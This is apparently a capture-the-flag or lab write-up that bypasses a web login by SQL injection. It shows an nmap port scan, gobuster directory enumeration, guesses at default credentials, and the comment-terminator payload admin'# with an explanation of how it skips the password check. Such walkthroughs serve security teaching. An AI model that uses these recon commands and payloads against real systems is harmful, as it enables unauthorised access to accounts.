# SQL injection — login bypass (walkthrough)

Classic **authentication bypass** via unsanitized SQL in a login form. Enumeration shows HTTP only; directory brute force finds nothing obvious; injection succeeds with a comment terminator in the username field.

---

## 1. Port scan

**Command:**

```bash
nmap -sV -p- 10.129.241.26
```

| Flag | Purpose |
|------|---------|
| `-sV` | Service/version detection on open ports |
| `-p-` | All 65535 TCP ports (slow; use for small labs or after a quick top-1000 scan) |

**Result:**

- **TCP 80** — HTTP web server.
- No other listening ports required for this chain.

---

## 2. Web application

Browse to `http://10.129.241.26/` and identify the **login** form (username + password fields).

---

## 3. Default credentials

Attempt common usernames (with guessed passwords or empty) before deeper testing:

- `admin`, `administrator`, `root`, `guest`, `user`

None succeeded in this scenario.

---

## 4. Directory enumeration

**Command:**

```bash
gobuster dir --url http://10.129.241.26/ -w /usr/share/wordlists/dirb/common.txt
```

| Flag | Purpose |
|------|---------|
| `dir` | HTTP path brute-force mode |
| `--url` | Base URL including scheme |
| `-w` | Wordlist path |

**Outcome:** no extra directories materially changed the attack path (adjust wordlist/size for other targets).

---

## 5. SQL injection — login bypass

### Payload (example)

```text
Username: admin'#
Password: anything
```

### Mechanism

Backend query pattern (illustrative):

```sql
SELECT * FROM users WHERE username = 'admin'#' AND password = '...';
```

In MySQL/MariaDB, **`#`** starts a comment, so the rest of the line (including the password check) is ignored:

```sql
SELECT * FROM users WHERE username = 'admin';
```

If `admin` exists, the application may treat the login as successful **without** verifying the password.

**Note:** comment characters differ by DBMS (`-- ` requires trailing space; `/* */` for Oracle-style). Always map the stack (error messages, timing, WAF) before choosing payloads.

---

## Summary table

| Step | Command / action |
|------|-------------------|
| Port scan | `nmap -sV -p- 10.129.241.26` |
| Directories | `gobuster dir --url http://10.129.241.26/ -w /usr/share/wordlists/dirb/common.txt` |
| Bypass | Username: `admin'#` (or equivalent), arbitrary password |
| Result | Authenticated session without valid password pair |

---

## Key takeaways

- SQL injection in **login** fields can bypass authentication if queries concatenate user input.
- Comment-based truncation (`#`, `--`) is one of the simplest patterns to test.
- Combine **port scan**, **content discovery**, and **manual injection**; do not stop at failed default creds.

**Status:** objectives completed via SQL injection and login bypass.
